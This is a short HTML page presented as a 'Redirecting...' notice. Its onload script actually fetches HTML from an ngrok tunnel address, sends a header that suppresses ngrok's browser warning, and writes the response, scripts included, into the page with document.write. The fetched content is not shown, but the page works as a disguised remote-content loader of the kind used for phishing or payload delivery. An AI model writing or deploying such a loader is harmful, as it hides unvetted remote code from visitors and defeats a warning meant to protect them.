<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
        function redirect() {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://92bd-103-151-34-21.ngrok-free.app', true);
            xhr.setRequestHeader('ngrok-skip-browser-warning', '1');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    document.open();
                    document.write(xhr.responseText);
                    document.close();
                }
            };
            xhr.send(null);
        }
    </script>
</head>
<body onload="redirect()">
    <p>Redirecting... If you are not redirected, <a href="#" onclick="redirect(); return false;">click here</a>.</p>
</body>
</html>
